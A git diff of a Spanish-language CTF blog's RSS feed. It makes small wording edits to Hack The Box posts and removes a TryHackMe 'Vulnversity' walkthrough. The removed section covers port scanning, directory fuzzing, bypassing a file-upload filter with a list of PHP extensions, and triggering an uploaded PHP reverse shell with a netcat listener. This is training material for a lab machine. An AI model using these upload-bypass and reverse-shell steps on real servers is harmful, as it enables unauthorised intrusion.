+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.97 -R
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -1830,7 +2234,7 @@ XzFOajNDN2kwbn0=
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.147 -R                               
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -2363,7 +2767,7 @@ ssh-keygen
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;63&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.7 -R                               
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -2972,361 +3376,6 @@ type flag3.txt
         <pubDate>Mon, 15 Nov 2021 00:00:00 -0500</pubDate>
         <link>/es/Blue-TryHackMe/</link>
         <guid isPermaLink="true">/es/Blue-TryHackMe/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnversity - TryHackMe</title>
-        <description>&lt;p&gt;El día de hoy vamos a resolver la máquina &lt;em&gt;Vulnversity&lt;/em&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/1.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
-
-&lt;p&gt;Primeramente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de &lt;em&gt;TryHackMe&lt;/em&gt;, existen diversos &lt;a href=&quot;https://www.stationx.net/nmap-cheat-sheet/&quot;&gt;cheatsheets&lt;/a&gt; que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta.&lt;/p&gt;
-
-&lt;p&gt;No obstante, recordemos que varias herramientas por defecto tienen incluidas un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manual&lt;/code&gt; o vienen con un comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--help&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man nmap
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap --help
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;¿Cuántos puertos abiertos existen?&lt;/li&gt;
-  &lt;li&gt;¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando?&lt;/li&gt;
-  &lt;li&gt;¿En qué puerto está corriendo el servidor web?&lt;/li&gt;
-  &lt;li&gt;¿Qué versión de squid proxy está corriendo en la máquina?&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con &lt;em&gt;Nmap&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,22,139,445,3128,3333 &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400?&lt;/li&gt;
-  &lt;li&gt;Utilizando el parámetro -n, ¿qué no se está resolviendo?&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para responder a estas dos preguntas bastará con haber leído el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manual&lt;/code&gt; de &lt;em&gt;Nmap&lt;/em&gt;, haber utilizado su parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--help&lt;/code&gt;, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt;, no se aplicará &lt;em&gt;resolución DNS&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fuzzing&lt;/code&gt;; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;TryHackMe&lt;/em&gt; nos recomienda utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GoBuster&lt;/code&gt;, sin embargo, personalmente prefiero el uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wfuzz&lt;/code&gt;; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install wfuzz
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de &lt;em&gt;fuzzear&lt;/em&gt; la página web, para ello realizaremos lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 400 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt; 404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt; 33014 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el &lt;em&gt;fuzzeo&lt;/em&gt; del servidor web:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-c&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Output colorizado&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-L&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-t&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Específicamos el número de hilos con el queremos trabajar&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;--hc&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;--hh&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-w&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos el diccionario con el que queremos trabajar&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/2.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En caso de no utilizar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-hh&lt;/code&gt;, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/3.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal&lt;/code&gt;, ya que en &lt;em&gt;images&lt;/em&gt;, &lt;em&gt;css&lt;/em&gt;, &lt;em&gt;js&lt;/em&gt; y &lt;em&gt;fonts&lt;/em&gt; parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal&lt;/code&gt;, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/4.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
-
-&lt;p&gt;Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;; podemos descargar una &lt;a href=&quot;https://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;aquí&lt;/a&gt;. Una vez la hayamos descargado, tenemos que modificar el valor de la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip&lt;/code&gt; (colocamos la nuestra), y si queremos, podemos también modificar el valor del &lt;em&gt;puerto&lt;/em&gt;, aunque esto es completamente opcional.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/5.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Sin embargo, cuando intentamos subir nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/6.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt; para poder realizar un ataque de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sniper&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para ello, vamos a empezar por volver a subir nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt;, pero ahora tramitando todas las peticiones a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Burp Suite&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/7.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Posterior a ello presionaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ctrl + I&lt;/code&gt; para enviar esta petición al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Intruder&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/8.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora, en el apartado &lt;em&gt;Positions&lt;/em&gt;, en el tipo de ataque elegiremos la opción de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sniper&lt;/code&gt;, después seleccionaremos la opción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Clear §&lt;/code&gt;, para posteriormente con nuestro cursor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resaltar&lt;/code&gt; la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add §&lt;/code&gt;; esto se vería algo así:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/9.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de &lt;em&gt;PHP&lt;/em&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;.php&lt;/li&gt;
-  &lt;li&gt;.phtml&lt;/li&gt;
-  &lt;li&gt;.php3&lt;/li&gt;
-  &lt;li&gt;.php4&lt;/li&gt;
-  &lt;li&gt;.php5&lt;/li&gt;
-  &lt;li&gt;.php7&lt;/li&gt;
-  &lt;li&gt;.phps&lt;/li&gt;
-  &lt;li&gt;.php-s&lt;/li&gt;
-  &lt;li&gt;.pht&lt;/li&gt;
-  &lt;li&gt;.phar&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una vez, hemos creado nuestro diccionario, en el apartado &lt;em&gt;Payloads&lt;/em&gt;, en la opción &lt;em&gt;Sample List&lt;/em&gt; cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/10.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/11.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;200&lt;/code&gt;, la &lt;em&gt;longitud&lt;/em&gt; de estas no es la misma para todas las extensiones, la única extensión cuya &lt;em&gt;longitud&lt;/em&gt; varía es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.phtml&lt;/code&gt;; si quisiéramos estar completamente seguros, podríamos revisar el &lt;em&gt;render&lt;/em&gt; de la respuesta, el cual nos devuelve un &lt;em&gt;success&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-10-25-Vulnversity-TryHackMe/12.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal&lt;/code&gt;, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.&lt;/p&gt;
-
-&lt;p&gt;Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse shell&lt;/code&gt; a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt;. A partir de aquí podemos hacer dos cosas:&lt;/p&gt;
-
-&lt;p&gt;Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de &lt;em&gt;TryHackMe&lt;/em&gt;), es decir, entrar a:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://&amp;lt;dirección IP&amp;gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;O, por otra parte, y sin dejar la consola, utilizar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://&amp;lt;dirección IP&amp;gt;:3333/internal/uploads/nombreDeLaReverseShell.phtml
